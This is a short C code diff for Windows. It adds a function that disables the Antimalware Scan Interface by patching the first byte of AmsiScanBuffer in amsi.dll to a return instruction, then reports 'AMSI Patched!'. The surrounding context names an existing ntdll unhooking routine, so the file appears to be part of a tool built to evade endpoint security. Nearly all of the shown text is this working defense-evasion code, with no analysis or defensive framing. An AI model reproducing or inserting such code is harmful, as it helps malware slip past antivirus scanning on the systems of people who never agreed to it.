@@ -131,3 +131,32 @@ BOOL unhook_Ntdll() {
 	}
 	return 0;
 }
+
+BOOL AmsiPatch() {
+
+	HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
+
+	if (hAmsi == NULL) {
+		return 0;
+	}
+
+	PVOID pAmsiAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
+
+	if (pAmsiAddr == NULL) {
+		return 0;
+	}
+
+	DWORD oldProtect = 0;
+	if (VirtualProtect(pAmsiAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+		*(BYTE*)pAmsiAddr = 0xC3;
+		VirtualProtect(pAmsiAddr, 1, oldProtect, &oldProtect);
+		FlushInstructionCache(GetCurrentProcess(), pAmsiAddr, 1);
+		printf("[x] AMSI Patched!\n");
+		return 1;
+
+	}
+	else {
+		return 0;
+	}
+
+}
